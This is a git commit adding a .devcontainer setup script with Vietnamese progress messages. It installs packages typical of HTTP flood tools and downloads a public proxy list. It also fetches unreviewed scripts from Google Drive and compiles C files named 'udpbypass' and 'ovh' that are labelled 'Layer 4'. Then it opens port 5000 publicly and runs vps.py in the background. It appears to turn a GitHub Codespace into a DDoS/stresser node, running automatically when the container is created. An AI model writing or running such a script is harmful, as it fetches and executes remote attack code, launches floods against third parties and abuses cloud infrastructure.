29f302a0361223d1fee37120c97f4af0dc3b36a7
RustDesk <phamquangvinh058+5@gmail.com>
2026-04-06 22:39:47 +0700

    script

---
+++ .devcontainer/setup.sh
@@ -0,0 +1,37 @@
+#!/bin/bash
+export DEBIAN_FRONTEND=noninteractive
+echo "[1/4] Cài đặt môi trường..."
+sudo apt-get update -y && sudo apt-get install -y python3-pip wget gcc nodejs npm
+pip install --no-cache-dir gdown flask requests
+npm install cluster colors axios discord.js user-agents puppeteer-real-browser colorama crypto gradient-string header-generator hpack socks
+
+echo "[2/4] Tải tài nguyên từ H2 Network..."
+mkdir -p /workspaces/bot-core && cd /workspaces/bot-core
+wget -q https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt -O proxy.txt
+
+# Scripts chính
+gdown 1l7XemuQ4MuxYYzmzLYnXTF9tXw_mutgV -O hieu.js
+gdown 1Kpe6qSbsNaS-z0f9BMCyJsi3ooVouPLh -O raw.js
+gdown 1Nr_mkvx54ih7esfpFd8QheaVvGL8O2J6 -O vps.py
+gdown 1Vq9T9WkLJdMDQf9s2mL4w32cRsxr6lPk -O bot.js
+gdown 1ICGS7OQEsc4nbMWEVNU7OM9manNl-OAU -O data.json
+
+# Scripts bổ sung
+gdown 1d7DjHHAqvOA5QkYw196JJZ_Vj3xMXfZF -O extra1.js
+gdown 1yUo671F3nwX1KGRYxzZl09F15eMtNaZV -O extra2.js
+gdown 1W-q3LSgM6oE14Fd_rrWVwRUmqxgChdMZ -O extra3.js
+gdown 1z0VINnYv93dXpwfsN524oIDugy1gaX8A -O extra4.js
+gdown 1_wXltanrFfLzl0hembWZ1f6PwFy4qbZW -O extra5.js
+gdown 1YKNPGX9B3u9p-NaV33BgVJ0W9lkrRgQx -O extra6.js
+
+echo "[3/4] Biên dịch Layer 4..."
+gdown 1MuaBraso20I73ixepu6SQWDq0GMnlU05 -O udpbypass.c
+gdown 1Q2VYSvBdeclp6A1f8xePFrT6Yt7ZB2gX -O ovh.c
+gcc udpbypass.c -o udpbypass && gcc ovh.c -o ovhbypass
+chmod +x udpbypass ovhbypass
+
+echo "[4/4] Cấu hình Public Port 5000..."
+gh codespace ports visibility 5000:public -c $CODESPACE_NAME
+
+nohup python3 vps.py > vps.log 2>&1 &
+echo "H2 SYSTEM READY."
